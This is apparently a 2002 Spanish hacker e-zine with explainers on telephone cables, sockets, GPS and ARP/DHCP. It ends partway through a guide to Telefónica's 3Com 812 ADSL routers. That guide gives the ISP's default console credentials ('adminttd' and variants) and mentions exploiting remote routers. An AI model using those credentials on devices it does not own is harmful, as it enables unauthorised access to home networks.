


        - D A T A C O D E -  E Z I N E - T É C N I C O - S W E E T - D E V I L S - I N C -




*****************************
* Número: 4                 *               
* Año: 3                    *
* Fecha de edicion:29/07/02 *
*****************************



*************************************
************ EDITORIAL **************
*************************************
*************************************

Despues de más de un año sin sacar una Datacode, nos ponemos las pilas y sacamos lo que ahora es
la número 4 de nuestra e-zine.
En todo este tiempo al grupo le ha pasado absolutamente de todo, como por ejemplo, estuvimos un
buen tiempo offline, se fue gente del grupo y de otra no tenemos ni noticias. Despues de todo
esto volvimos con un poco más de ganas, elegimos nueva gente para que nos ayudaran y nos dieran 
más ganas de trabajar en el grupo y le dimos un nuevo formato a la web gracias a j@que (osease 
yo :) que se ha puesto las pilas y puso el sitio en php-nuke.
Tambien han ingresado al grupo cuatro nuevas personas, sus nicks son: Anakin, N4XoR, _TyR y 
Pinoch0, les damos la bienvida y esperamos que se sientan a gusto en nuestra casa. Tambien 
recibimos la sorpresa de la vuelta de SHOT y LYNX que se vuelven a integrar al grupo, Bienvenidos!!.
Ahora todo queda en manos del grupo, y de ustedes que son nuestros lectores.
Desde ya les damos las gracias por haberse bajado la e-zine y que la esten leyendo, asi que sin
mas preambulos vamos al grano :).

                                                j@que
                                           j4qu3@lycos.es

TODOS LOS COMENTARIOS QUE TENGAS SOBRE LA E-ZINE POR FAVOR HAZLOS A: sweet_devils@hotmail.com


********************************************************************** 
* IMPORTATE:                                                         *
*	  NINGUNO DE LOS ESCRITORES, EDITORES NI MIEMBROS DE ESTA    *
* REVISTA SE HACE RESPONSABLE POR EL MAL USO QUE LE PUEDAS DAR A LO  * 
* AQUI EXPUESTO, ESTO ES SOLO PARA TU EDUCACION Y NO HACEMOS         *
* APOLOGIA DE NINGUN TIPO, SOLO USAMOS NUESTRO DERECHO CONTITUCIONAL *
* DE LIBRE EXPRESION. HACK ETICO... ;o)                              *
*                                                                    *
**********************************************************************


                                      **************
                                      *** INDICE ***
                                      **************
                                      **************

|---> [1] Introducción a los cables telefónicos               Autor: N4XoR
|---> [2] Sockets                                             Autor: Anakin
|---> [3] Introduccion al GPS (Parte 1)                       Autor: j@que
|---> [4] Protocolos ARP, ARPproxy, Asignacion de IPs y demas Autor: Bactery
|---> [5] Routers 3com officeconnect 821                      Autor: pinoch0
|---> [6] Seguridad en linux (I)                              Autor: _TyR
|---> [7] Introduccion a la Inteligencia Artificial           Autor: Anakin




                               *****************************
                               ************ 1 **************
                               ******** TELEFONIA **********
                               ********** N4XoR ************
                               *****************************
                               *****************************


> Introducción a los cables telefónicos.

En este panfleto, por que esto es un panfleto, veremos como se fabrica y se 
usa un cable telefónico de los usados normalmente por timofonica. Nos 
centraremos en los cables de cobre  y en próximos ezines veremos cables de 
fibra y coaxiales.

Por supuesto deciros que uno no esta en posesión de la verdad absoluta, y como 
asno que patea este jodido mundo muchas veces mete la gamba hasta el hígado, 
así que si alguien lee esto y detecta errores o fallos, que no se alarme, es 
normal. (De zoquetes ta el mundo lleno. xD).

Bien empecemos que si no me enrollo.

Comenzaremos por ver la composición y fabricación de un cable de pares de 
cobre.

La fabricación se compone de 4 fases básicas:

- Aislado.
- Pareado.
- Cableado.
- Forrado de cubierta final.

Aislado.

En este proceso lo que hacemos es trefilar y aislar los hilos conductores que 
forman el cable.

Trefilar es conseguir que los conductores tengan un diámetro determinado por 
medio de un proceso de estiramiento, haciendo pasar un alambre de cobre de un 
diámetro alto por una serie de poleas y baños de recocido y unos calibres de 
diamante hasta conseguir el diámetro deseado.
Básicamente se trabaja con los siguientes diámetros:

- 0,405 mm
- 0,5 mm
- 0,64 mm
- 0,9 mm

Aunque también se fabrican cables de menor diámetro, 0.32, y de mayor 1,3 mm

Aunque al cobre se le hace un trefilado previo para poder trabajar con ello en 
las extruder (maquinas de aislado), el proceso donde se le da el diámetro 
final al conductor se realiza en una maquina extrusora, que además de trefilar 
el hilo a un diámetro determinado, aísla los conductores con determinados 
compuestos que básicamente son:

- Polietileno sólido.
- Polietileno celular.
- Foam.
- Foam Skin.
- PVC (poli cloruro de vinilo).
A estos compuestos se les añade un colorante del tipo Masterbach en un 
porcentaje determinado para dar color al aislamiento.

Bueno pues ya tenemos una bobina de conductor aislada de determinado color.

Pasemos al siguiente proceso


Pareado.

Parear es torsionar dos conductores con un paso determinado. Entiendase por 
paso, la cantidad de torsiones por metro. O sea que si una bobina pareada lleva
un paso 76 (por ejemplo) significara que los conductores se torsionan 76 veces
en una distancia de un metro.

También existen cables de cuadretes en los que en vez de torsionarse 2 
conductores son 4. 

Las bobinas de pareado que forman un cable dependiendo del color llevan todas 
paso diferente para evitar un problema que veremos más adelante.

Por ejemplo, todas las bobinas Blanco-Azul llevan el mismo paso, pero es 
diferente al de las que son Blanco-Naranja, o Amarillo-Gris.

En cuanto al pareado poco más que contar así que pasaremos al siguiente proceso.


Cableado.

Aquí la cosa empieza a complicarse.

Para ver la formación de un cable veremos primero un código de colores de
pares utilizado por telefónica. El nombre de este código es Event Count.

El código se compones de 10 colores básicos agrupados en 2 grupos:

Grupo 1:
- Blanco. (Bl)
- Rojo. (Ro)
- Negro. (Ne)
- Amarillo.  (Am)
- Violeta. (Vi)
Grupo2:
- Azul. (Az)
- Naranja. (Na)
- Verde. (Ve)
- Marrón. (Ma)
- Gris. (Gr)


Combinando estos dos grupos obtenemos un total de 25 tipos de pares diferentes
Ya que un par no puede contener dos colores del mismo grupo salvo la excepción 
de un par del que luego hablaremos.

Ósea:

Par 1: Bl-Az
2: Bl-Na
3: Bl-Ve
4: Bl-Ma
5: Bl-Gr
6: Ro-Az
7: Ro-Na

Así hasta el 25 que es Vi-Gr.

A estos 25 pares los llamaremos subunidad y cada 100 pares los llamaremos grupo.
La excepción de la que antes hablábamos es el par Bl-Ne, llamado Piloto. Este 
par es utilizado por asistencia técnica para comunicarse con la central donde 
esta conectado ese cable, ósea  es un par de uso interno de telefónica y salvo 
excepciones no hay abonados conectados a el.
Hay un piloto por grupo, ósea uno por cada 100 pares con lo cual el grupo 
tiene realmente 101 pares.
 
Los cables pueden tener desde 1 par, hasta 2424 y 3636 pares (de mas pares no 
los he visto).


Centrémonos en la fabricación de uno grande, un 2424 por ejemplo.

Cargamos una cableadota con 101 pares y los agrupamos de 25 en 25 en cuatro 
subunidades, salvo la última que por contener el piloto tendrá 26.

Cada subunidad tendrá distribuidos los pares en capas concéntricas en una 
formación de 3 en el centro 9 en la 2ª capa y 13 en la 3ª.

Amarramos esas subunidades con una ligadura de nylon utilizando el mismo código
de colores, ósea los primeros 25 con ligadura Bl-Az los 2º con Bl-Na así hasta 
completas los 101 cuyos últimos 26 estarán con Bl-Ma.
Los siguientes de 101 estarán, el primer grupo con Bl-Gr, los segundos serán 
Ro-Az, así hasta Ro-Ve, y así sucesivamente hasta completar los 606 pares.
De tal manera que obtendremos 6 grupos dispuestos en 4 subunidades de 25ª, que 
para que se mantengan en su formación de 101 aplicaremos una ligadura de nylon 
monocolor. Esta ligadura será en los primeros 606 pares de color blanco, ósea 
que los primeros seis grupos tendrán ligadura blanca, del 607 al 1212 esta 
ligadura será roja, del 1213 al 1818 será negra y del 1819 al 2424 amarilla.

De esta manera tendremos todos los pares diferenciados.

Ahora hay que formar el cable final con todos los grupos.

Lo cargamos en una cableadota de núcleos(grupos) en una distribución de 4 en la
1ª capa, 8 en la 2ª y 12 en la 3ª, aplicándole 2 cintas de poliéster de forma 
helicoidal consiguiendo así un cable de 65 mm de diámetro aproximadamente 
totalmente redondo y preparado para aplicarle la cubierta.

Pero ni todos los cables llevan núcleos (grupos) de 101, ni todos llevan 
poliéster en la cableadora de núcleos.

En los cables inferiores a 1212 la formación de los núcleos es de 50 pares, 
distribuidos los pares en subunidades de 8 y 9 pares de la siguiente forma.

Una de 8 en el centro de Bl-Az (suponemos que es el núcleo 1) otra de 8 y otra 
de 9 también con Bl-AZ hasta completar los 25 en la 2ª capa  y otras tres de 
8,8,9  Bl-Na también en la segunda capa completando así los 50 pares en una 
formación 1 en el centro 5 en la 2ª capa. El 2º núcleo será igual excepto por 
las ligaduras que serán Bl-Ve y Bl-Ma y por que las dos ultimas subunidades 
serán 9-9 teniendo la ultima el piloto (par Bl-Ne), logrando así una subunidad 
de 51.

En la cableadora de núcleos tendremos 12 núcleos para un 606 y 18 para un 909.

En los cables menores de 606 volvemos a los núcleos de 25, saliendo estos 
directamente a la cableadora de núcleos por lo que tendremos en formación 3-9, 
12 núcleos para un 303, y 16 núcleos para un 404 en una formación 1-5-10.

Hay más formaciones en cables menores, todos estos cambios en la formación se 
realizan para conseguir un cable lo mas redondo posible.

Los cables pueden salir de la habladora de núcleos con poliéster helicoidal o 
con ligadura blanca de nylon para amarrarlos.

Generalmente los cables no rellenos suelen salir con poliéster, y los cables 
rellenos de grasa (ya veremos lo que es en el apartado de cubiertas), siempre 
salen con ligadura (obvio, si les ponemos poliéster a ver quien les inyecta 
luego grasa).

Bien, ya tenemos el cable, ahora nos falta la cubierta exterior.


Cubierta.

Durante el proceso de cubierta procederemos a inyectar grasa si el cable es 
relleno. Dicha grasa es un compuesto de vaselina hidrófuga que se inyecta al 
cable para evitar que en caso de perforación de la cubierta el agua corra a 
través del cable, se inyecta a una temperatura de fusión de la grasa que es de 
85 grados aproximadamente y cuando enfría se queda una pasta semisólida 
rellenando tolos intersticios entre los pares y núcleos del cable.

Si el cable no va relleno es muy posible que llegue ya a cubiertas con el 
poliéster puesto, si no es así se le aplica uno longitudinal de más espesor 
que el helicoidal y si es de grasa también se le pone una vez que sale del 
inyector.

Seguidamente se le aplica una cinta de aluminio-poliéster longitudinal a la 
cual se le aplica calor en los bordes para que selle, consiguiendo así un tubo.

Por ultimo se le extruye una capa de polietileno negro de alta densidad, 
pasando por un canalón de agua para su enfriamiento y a la salida de ese 
canalón se le marca los metros y la leyenda rebobinándolo en una bobina de 
madera, para su posterior paso a calidad y después a logística, para el 
forrado de la bobina y su embarque para cliente
También hay cables de doble cubierta que en vez de ser marcados pasan de nuevo 
a otra extruder que les pones otra cinta de acero corrugado que también se 
sella, y una segunda cubierta, esta segunda cubierta es ya marcada con los 
metros y la leyenda

Hay muchos tipos de cables, con sus diferentes aislamientos formaciones y 
cubiertas. Esto que hemos visto es un cable típico de telefónica, para ser 
exactos un 26 EAP 2424.   


Algunas consideraciones:

Los cables de pares se utilizan básicamente para la comunicación en fonía, 
teniendo en cuenta que telefónica considera como aceptable el rango de 
frecuencias entre 300 y 3.400 Hz, que es cercano al de la voz humana, 
obteniendo de ese rango una relación calidad-costes aceptable.

Salvo excepciones a grandes empresas, organismos oficiales, o por que el 
abonado así lo solicite (gastándose un pastón), la compañía no llegara nunca 
al abonado con fibra óptica debido a su elevado coste. Así que siempre se esta 
limitado por la capacidad del cable de cobre en trasmisión de datos.

En estos cables la tensión con el terminal en reposos es de -48 Volts, la 
tensión.
Con el terminal descolgado o de conversación es de -24volts, y la tensión de 
llamada es de 72 volts de alterna.

Espero que este documento os sirva para entender la estructura de los cables 
que se utilizan normalmente en telecomunicaciones.

En próximos documentos veremos lo cables de fibra óptica y los sistemas de 
conmutación y transmisión entre centrales.

Espero no haber sio mu pesao. xD

ACLARACIÓN: Este articulo fue tambien publicado en el e-zine: 7a69

N4XoR



                               *****************************
                               ************ 3 **************
                               ********* SOCKETS ***********
                               ********* Anakin ************
                               *****************************
                               *****************************

Hola soy Anakin,son las 18:22 P.M en España , y como bien pone en el titulo
este articulo trata sobre una introdución a los sockets . Sus tipos y eso ... lo que
no voy a explicar o al menos en este articulo es su programacion. Quizas si todo va bien
en el proximo "articulo" sobre sockets explicare su sobre su programación .

Cualquier cosa que necesiteis : duda , critica  etc no dudes en enviarme un email a
(Kerberos87@hotmail.com) se que es el server de mocosoft pero en fin que se le va hacer :)
Dejo de enrollarme y empiezo :

Concepto Socket:

En primer lugar quiero definir y que quede bien claro lo que es un socket.
pues bien un socket no es otra cosa que un punto de "encuentro" de
comunicaciones entre procesos . En otras palabras para que lo entendais es
un enlace o puerta  de comunicacion entre dos conexiones conectadas a una red. 
Ahy diferentes tipos de Sockets que se clasifican segun como se describan, 
segun como envien la informacion. Por ejemplo el Socket UDP (User Datagram Protocol)
o los Stream  TCP  (Tranfer control Protocol) aqui describo algunos


-Sockets Raw
-Sockets Stream
-Sockets Datagram (UDP)

A continuacion voy a definir los distintos sockets que hay aqui arriba :


Los Sockets Raw:

Se utilizan basicamente para comunicar dos entidades ip ( internet protocol)
los sockets raw son muy pontentes y se utilizan basicamente para depuarar
o limpiar los codigos del los  protocolos. El socket raw es el que permite el
acesso a las capas de protocolos mas bajos .


Los Sockets Datagram

Son aquellos sockets que no son orientados a conexion y no se aseguran del envio de los datagramas,
tambien tiene envio de datagramas con un tamaño limitado , el socket Datagram proviene
de el UDP (User Datagram Protocol) que cada vez que se establece alguna comunicación
tienen que enviar al datagrama el descriptor y la direccion local del socket

Los Sockets Stream

Los Sockets Stream son sockets orientados a conexion si se rompiera el enlace de conexion
serian informados ya que el protocolo (TCP) Transfer Control Protol es un protocolo orientado
y que se asegura en  el envio de paquetes a diferencia del UDP .
El tamaño de los sockets stream tienen un tamaño muy variable.Los sockets stream son
muy parecidos a los sockets Seqpackets . Como ya he dicho antes los Stream usan el protcolo
TCP a una conexion orientada los streams usan dos sockets :

1er Sock. Que esta ocupado con el server
2do Sock. Que pide una conexion al cliente

Una vez los dos esten conectados se pueden enviar paquetes de datos entre ellos .


Principales diferencias entre los Sockets Stream y los Datagram:


	Sockets Stream                              Sockets Datagram

-TCP (TCP tranfer control protocol)       -UDP (User Datagram Protocol)
-Estan Orientados a Conexion              -No estan Orietados a Conexion
-El tama¤o es variable                    -El tama¤o es limitado
-Se asegura del envio de datos            -No se asegura de el envio de los datagramas propiedad
                                           del (UDP)


En conclusion los sockets Stream se usan mas para servicios de red como puede ser un telnet,
o un ftp (file transfer protocol)  ... , sin embargo los sockets Datagram se usan mas para
aplicaciones entre el server y el cliente o al reves :)  . Tambien ahy que tener claro que 
los Stream son orientados y se assegura del envio de datos , y que el Socket Datagram no, 
solo sino que no es orientado a conexion y no se assegura del envio del datagrama.
Bueno amigos aqui acaba mi primer articulo para los sweet devils espero que aya gustado como 
he dicho antes qualquier aclaracion o critica ... [kerberos87@hotmail.com] gracias a todos 
lo que habeis leido este articulo =)

                                                    Anakin
                                              kerberos87@hotmail.com
                   	



                             *****************************************
                             ****************** 4 ********************
                             ********* Introduccion al GPS ***********
                             **************** j@que ******************
                             *****************************************
                             *****************************************

GPS
***

Descripcion:
***********

GPS es un sistema global de posicionamiento, que esta basado en un sistema de
satelites que envian ondas de radio emitidas por una constelacion de 21 satelites mas 3 de 
emergencia (por si alguno llega a fallar).
Estos satelites estan en orbita alrededor de la tierra y dan una vuelta alrededor de la misma
cada 24 horas, lo que quiere decir que siempre estan ubicadas en el mismo punto con respecto de 
la tierra.
Este sistema permite el calculo de coordenadas tridemensionales que pueden utilizarse en
navegacion.
Se puede conocer las coordenadas del receptor a partir de las coordenadas de los
satelites y la distancia medida a por lo menos cuatro satelites mediante una interseccion
espacial. La distancia a cada satelite es calculada por la formula: d = c* D t ; donde c 
es la velocidad de la luz en el vacio y D t es el tiempo de recorrido de la señal enviada 
del satelite a su receptor.
Los satelites y los receptores llevan consigo unos relojes, y como no se pueden tener los
relojes en hora exacta va a ver un pequeño error en la distancia medida.
Como el calculo de distancia se hacen que relojes distintos se usa el termino 
pseudo-distancias (distancias medidas).
Ademas de que los relojes no estan exactos y por lo tanto no se pueda calcular bien la
distancias existen otros factores que pueden dar errores, uno de ellos es que al viajar la
señal emitida por el satelite y al tener que atravesar las capas atmosfericas, las señales 
se realentizan y provocan un pequeño lag y por esto existe ese margen de error.
Los margenes de errores que puden llegar a existir son de 100 a 150 m en las tres 
coordenadas.

Modalidades de medicion.
***********************

Se considera que existen dos tipos de toma y procesamiento en las mediciones que se realiza 
a traves del gps. Estas modalidades son denominadas Estaticas y Cinematicas. La modalidad 
Estatica implica a observaciones estacionarias y la cinematica a objetos que estan en 
constante movimiento.

Formación del sistema:
*********************

La formacion del sistema se divide en tres segmentos: El segmento espacial, que es la 
constelacion de los satelites; segmento de control, que es el encargado de controlar y 
monitorear todo el sistema y el segmento del usuario que son los distintos tipos de receptores.

-Segmento espacial: Se refiere a la cobertura global de cuatro hasta ocho satelites con una 
elevacion de 15º

-Segmento de Control: Este segmento esta formado por una red de estaciones encargadas de 
monitorear y retroalimentar todo el sistema de satelites. Esto se logra a partir de una serie
de estaciones ubicadas convenientemente alrededor de la tierra.

-Segmento del usuario: Este segmento se refiere a los distintos tipos de receptores que hay en
el mercado y de los distintos usuarios del sistema

Tipos de receptores:
*******************

El tipo de receptor que sea necesario utilizar dependera del tipo de observaciones que se
realizen a travez de este sistema y de la disponibilidad de codigos. Los receptores pueden ser
clasificados por sus caracteristicas

Código C/A
Código C/A + fase portadora L1
Código C/A + fase portadora L1 + fase portadora L2
Código C/A + código P + fases portadoras L1, L2

Otra clasificación de los receptores es por el tipo de usuarios:

Receptores militares
Receptores civiles
Receptores para navegación
Receptores geodésicos.

Distintos tipos de Usos:
***********************

EL GPS tiene hoy por hoy muchisimos usos, un caso personal es que por cuestiones de trabajo he
tenido el placer de visitar una estacion de Colectivos situada en Cadiz (España) la cual tenian
un ordenador que con un sistema de GPS controlaban a los colectivos a travez de su recorrido, El
sistema es realmente fantastico y muy eficiente, con muy poco margen de error. Los unicos 
momentos en el que la señal podia ser interrumpida era cuando el colectivo pasaba por debajo de
un puente. Este sistema tambien sirvio para poder implementar en cada parada un letrero con el 
tiempo exacto que tardara el colectivo en pasar.
Otro uso (creo que uno de los mas importantes) es en navegacion, de esta forma podemos controlar
un barco a treves de este sistema y saber su posicion actual por si llegara a necesitar hacer una
llamada de SOS.
Tambien se puede utilizar este sistema en topografia y geodesia donde es posible conocer con gran
exactitud la diferencias de coordenadas entre dos o más receptores.

Final, Despedida :( :
********************

Hemos llegado al final de este pequeño articulo dedicado al GPS, la fuente de este manual ha sido
sacada de la Escuela de Topografia, Catastro y Geodesia la cual me a ayudado a contruir este 
articulo con el aporte de mi experiencia propia.
No se si existira esa segunda parte, pero ustedes los lectores podrian aconsejarme si deberia 
existir esa parte.
Quiero mandarle un saludo a toda la gente del grupo y un beso gigante a mi novia mochi :) muack!

                           
                            "Cuanto mas se, mas me doy cuenta de que no se nada..."

                                                       j@que
                                                   j4qu3@lycos.es


                  ***************************************************************
                  ***************************** 4 *******************************
                  ***** Protocolos ARP, ARPproxy, Asignacion de IPs y demas *****
                  ************************** Bactery ****************************
                  ***************************************************************
                  ***************************************************************

v0.1



Un poco de teoria nunca viene mal, mas cuando de networking estamos hablando.

Vamos a adentrarnos en el mundo de los protocolos hablando de algunos poco conocidos como asi 
tambien aprender algunas tecnicas de asignacion de ip que podremos utilizar en nuestra red 
hogareña o una red a gran escala.



Muchas veces nos preguntamos como una maquina puede mandar informacion a otra maquina en la 
china. Muchas veces nos preguntamos como hace nuestro hub para que la informacion llegue a al 
host de nuestro red al cual realmente hemos enviado un paquete, todo esto tiene explicaciones 
que muchas veces nos dejaran boquiabiertos por la simplicidad de la misma.

Por eso mismo comencemos ahora.



Comunicacion en la red.

**********************



para que un paquete pueda llegar a un destino es necesario que contenga una dirección MAC 
destino y una dirección IP destino.
Si le falta una u otra dirección, los datos no se transportan. De esta manera, las direcciones 
MAC y las direcciones IP cumplen una función de equilibrio mutuo. Una vez que los dispositivos 
determinan las direcciones IP destino de los dispositivos destino, pueden agregar las direcciones
MAC destino a los paquetes de datos.
Hay muchas maneras en que los dispositivos pueden determinar las direcciones MAC que se deben 
agregar a los datos encapsulados. Algunos mantienen tablas que contienen todas las direcciones 
MAC y direcciones IP de los otros dispositivos que están conectados a la misma LAN. Estas se 
denominan tablas de Protocolo de resolución de direcciones (ARP), y asignan direcciones IP a las
direcciones MAC correspondientes.
Las tablas ARP son secciones de la memoria RAM, en las cuales la memoria caché se mantiene 
automáticamente en cada uno de los dispositivos. Es raro que se deba efectuar una entrada en la 
tabla ARP manualmente. Cada computadora de una red mantiene su propia tabla ARP. Siempre que un 
dispositivo de red desee enviar datos a través de una red, usa la información que le suministra 
su tabla ARP.



como actua ARP.

**************



Si un host desea enviar datos a otro host, debe conocer la dirección IP destino. Si no puede 
ubicar una dirección MAC para el destino en su propia tabla ARP, el host inicia un proceso 
denominado petición ARP.

Un host genera un paquete de petición ARP y lo envía a todos los dispositivos de la red. Para 
asegurarse de que todos los dispositivos vean la petición ARP, el origen usa una dirección de 
broadcast MAC (FF-FF-FF-FF-FF-FF).
Como los paquetes de peticiones ARP se desplazan en un modo de broadcast, todos los dispositivos
de una red local reciben los paquetes y los pasan a la capa de red donde se les realiza un 
examen más amplio. Si la dirección IP de un dispositivo concuerda con la dirección IP destino 
de la petición ARP, ese dispositivo responde enviando su dirección MAC al origen. Esto se 
denomina respuesta ARP.

Pero como hace ARP para mandar peticiones a redes diferentes???

la respuesta es ARP proxy.



El protocolo ARP proxy es una variante del protocolo ARP. En este caso, un dispositivo 
intermedio (por ej., un router) envía una respuesta ARP, de parte de un nodo final, hacia el host
que realiza la petición. Los routers que ejecutan el protocolo ARP proxy capturan paquetes ARP. 
Responden enviando sus direcciones MAC a aquellas peticiones en las que la dirección IP no se 
ubica dentro la gama de las direcciones de la subred local. 
Si la dirección de subred es la misma, el router descarta el paquete. El motivo por el cual se 
descarta el paquete es que la dirección IP destino está en el mismo segmento que la dirección IP
origen.
Si la dirección de subred es distinta, el router responderá con su propia dirección MAC a la 
interfaz que se encuentra directamente conectada al segmento en el cual está ubicado el host 
origen.
Dado que la dirección MAC no está disponible para el host destino, el router suministra su 
dirección MAC para obtener el paquete. 
Luego de ser necesario mandara peticiones ARP a su popia red para terminar el proceso.





Asigancion de Ips.

*****************

Existen dos metodos basicos de asignacion de direccion Ip, el direccionamiento estático y el 
direccionamiento dinámico. 

*)Direccionamiento estático.

Si asigna direcciones IP de modo estático, debe ir a cada dispositivo individual y configurarlo 
con una dirección IP. 

*)Direccionamiento dinámico

Hay varios métodos que se pueden usar para asignar direcciones IP de forma dinámica, por ej:


Protocolo de resolución de dirección inversa (RARP).

* * * * * * * * * * * * * * * * * * * * *  * * * * *



RARP es un Protocolo en la pila TCP/IP que brinda un método para encontrar direcciones IP en 
base a las direcciones MAC. 
Por ej: un origen conoce su propia direccion mac pero no su direccion Ip y no puedo encontrarla 
en la tabla ARP (tabla de asigancion MAC-IP).
Para lograr una solucion el dispositivo crea un paquete de petición RARP y lo envía a través de 
la red. Para asegurarse de que todos los dispositivos de la red vean la petición RARP, usa una 
dirección de broadcast IP.
Una vez que una estacion recibe el pedido lo verifica en su tabla de direcciones MAC para ver 
si la direccion concuerda con alguna entrada.
Si es positivo manda una respuesta RARP con la direccion ip vinculada a esa MAC.



BOOTP (BOOTstrasp Protocol)

* * * * * * * * * * * * * * 

Si bien el portocolo RARP resuelve el problema de resolucion ip de una maquina, podria incluir 
muchos mas datos que ayudarian a un mejor y mas fluido funcionamiento de la red.
Para esto BOOTP envia además de la dirección IP del solicitante, la direccion de getaway, la del 
servidor, y puede proporcionar otra información adicional. 


Protocolo de configuración dinámica del host (DHCP)

* * * * * * * * * * * * * * * * * * * * * * * * * *



DHCP permite que un host obtenga una dirección IP de forma rápida y dinámica. Todo lo que se 
necesita es una cantidad definida de direcciones IP en un servidor DHCP. A medida que los hosts 
entran en línea, se ponen en contacto con el servidor DHCP y solicitan una dirección, el 
servidor elige una dirección y se asigna a ese host.
Esto es solo el comienzo, en el proximo numero de DC nos adentraremos mas en el funcionamiento 
de internet, rounters, puentes, switchs y demas etc.
Les recomiendo darles una segunda y tercera lectura ya que marea un poco al comienzo.

saludos a todos.



Bactery

bactery@linuxmail.org

Cordoba -Argentina


                  ***************************************************************
                  ***************************** 5 *******************************
                  **************** Routers 3com officeconnect 821 ***************
                  ************************** Pinoch0 ****************************
                  ***************************************************************
                  ***************************************************************


Hola, este es mi primer artículo como miembro de esta e-zine, y me gustaría dar las gracias a 
todo los miembros por su apoyo y su amistad, espero que os guste y  que no sea el último.

Bien, en este artículo voy a hablar sobre los routers que instala la telefónica cuando contratas 
el ADSL en España, estos son los 3Com OfficeConnect 812.
Este artículo pretende ser tanto una guía para los usuarios del router, como una guía de su 
seguridad y como aprovecharse de router remoto.

--INSTALACIÓN--

Bien, una vez que la telefónica te instala el router en casa (cobrándote un huevo), lo primero 
que ves es que el "técnico" se ha llevado tanto el manual como el cd de instalación. Con la 
configuración que te dejan por defecto lo mas normal es que te funcionen las aplicaciones que 
actúan de clientes, como el navegador web, el msn, pero no funcionen las aplicaciones que actúan
como servidores (IRC, Napster, servicios de Web y FTP, etc).
Bien, lo primero que nos fijamos es si el router nos deja configurar remotamente, para eso 
probamos a entrar en modo configuración por el servidor web que usa Allegro Software Rompager v.2.10.
Bien, la ip que deja por defecto la telefónica es 10.0.0.1, pero para mirarlo por ejemplo en 
windows, vas a ms-dos:

C:\>netstat

Dirección IP . . . . . . . . . : 10.0.0.2
Máscara de subred. . . . . . . : 255.255.255.0
Puerta de enlace predeterminada: 10.0.0.1

Te saldrá algo parecido a esto, entonces sabes que la ip del router es 10.0.0.1.
Otra opción es hacer un traceroute y la ip siguiente a a la tuya, que es por donde salen los 
datos a internet es el router, pero esa suele ser la ip pública del router, es decir la que esta
de cara a internet.
Bien, primero intentamos entrar como dijimos antes por modo web, http://10.0.0.1, pero nada no 
optenemos respuesta, luego lo intentamos por telnet; telnet 10.0.0.1, y nada, esto quiere decir 
que los puertos están bloqueados.
Como podéis observar, podemos conectar nuestro router por un puerto serie que lleva con nuestro 
ordenador, que es lo mismo que si hiciésemos un telnet. Bien, una vez conectados, usamos un 
programa de comunicaciones, para windows podemos usar el hyperterminal, y para sistemas *nix 
puedes usar el minicom o el kermit por ejemplo. Acuérdate de cambiar en la configuración el 
tipo de terminal a v100 que en algunos programas no viene predeterminada.
Bien, configuramos los parámetros de la siguiente forma:
Conexión: COM1 (depende de la configuración de tu máquina, puede ser el 1 o el 2)
Bits por segundo: 9600
Bits de datos: 7
Paridad: E
Bits de parada: 1
Bien, una vez configurado, establecemos la conexión:
Login:
Lo primero podemos probar el usuario por defecto de estos dispositivos:
Login:root
Password:!root
Login incorrect.

Esto quiere decir que los de la telefónica han borrado el usuario por defecto, y seguramente 
habrán puesto sus usuario por defecto, xD:

Login:adminttd
Password:adminttd
3Com-DSL>

Bien, ya estamos dentro, cabe destacar que las passwords por defecto de la telefónica también 
pueden variar algunas otras son admintde ó admintdde.

Bien, antes de meternos a aprender a configurar el router, vamos a dejar claro algunos conceptos 
como son:
Monopuesto: En este modo se asigna la dirección de IP pública a un único ordenador y una 
dirección especial (IP de gestión de módem) al router para evitar tener que emplear dos 
direcciones de IP públicas. Es casi idéntico a tener un módem interno, el principal inconveniente
es que sólo se puede conectar un ordenador a internet por medio del router.
Multipuesto: Se asigna la IP pública al router y las privadas a los ordenadores de la LAN, 
empleando, NAT lo que permite a varios ordenadores acceder a internet, aunque no permite las 
conexiones entrantes, aunque se pueden configurar como indicaremos más tarde.
NAT = Network Address Translation, mecanismo de traducción para todos los puertos, en general 
de salida.
NAPT = Network Address Port Translation, se refiere a la traducción solo de determinados 
puertos, normalmente para entrada, por ejemplo, el 80 para Web, asi se puede enviar cada 
puerto a un ordenador diferente de la LAN.
iNAT = Intelligent NAT, de esa opcion solo dispone el 3Com 812 v1.1.7 o superior, con este 
método se redirigen los puertos inteligentemente al ordenador de la red local que cree que puede
ser el destinatario.
PAT = Port Addres Translation
DHCP: Dinamic Host Control Protocol, con este mecanismo, un host de la red local puede configurar
automáticamente los parámetros de red TCP/IP con sólo preguntándole generalmente al router, en 
lugar de tener que especificarlos.

Ahora que ya nos hemos familiarizado un poco con el router, hechemos un vistazo a la 
configuración:

3Com-DSL>help

The possible  commands are:
ADD                 ENABLE              PING                SAVE
ARP                 EXIT                QUICKVC             SET
BYE                 HANGUP              QUIT                SHOW
CAPTURE             HELP                REBOOT              TELNET
DELETE              HISTORY             RECONFIGURE         UPDATE
DIAL                KILL                RENAME              VERIFY
DISABLE             LEAVE               RESET
DO                  LIST                RESOLVE
ECHO                LOGOUT              RLOGIN

or any unique abbreviation of the keywords

Bien, como vemos el menú es bastante lioso, así que vamos a ir mirando las configuraciones:
Lo primero, si queremos configurar el router desde cero, desde el principio, tenemos tres modos:
-Quick Setup
-QuickVC Setup
-Manual Setup

Bien, el Quick Setup te permite configurar el router cuando no hay ninguna configuración activa, 
para esto usaremos el comando "delete configuration"
Esta interface te va mostrando una serie de parámetros para una fácil configuración bastante 
intuitiva.

Estas son las opciones:
Management Information
Console Login required
Console Login password
SNMP Managemnet
SNMP community
SNMP IP Address
SNMP read&write

Telnet Management:
TELNET User
TELNET Password

IP information:
IP network name
IP network address

IP Mask:
IP frame type

IP RIP:
DHCP server
DHCP Pool start ip address
DHCP Pool end ip address

TFTP Server information:
TFTP Access

IPX information:
IPX Network name
IPX network number
IPX frame type

Bridge information:
Bridge network name
Spanning tree

- QuickVC Setup:

Este es para administrar los circuitos virtuales, es decir en nuestro caso la configuración de 
acceso a  la red ATM.

De todas maneras yo recomiendo usar el modo manual dado que es mucho más flexible y se puede 
adaptar mejor a las necesidades del usuario.

- Configuración manual:
Bien, lo primero que tenemos que hacer para configurar el router manualmente es poner los 4 
microinterruptores de la parte de detrás del router hacia abajo.
Una vez hecho esto tecleamos en el CLI:
3Com-DSL>delete configuration
You have requested to Delete the system configuration
Please confirm the request.(No/Yes):
Tecleamos yes y se reiniciara el router:
3Com-DSL>delete configuration
You have requested to Delete the system configuration
Please confirm the request.(No/Yes):Yes
Deleting Configuration and Rebooting....
At 12:07:36, Facility "Configurator", Level "CRITICAL":: Resetting configuration
to factory defaults.
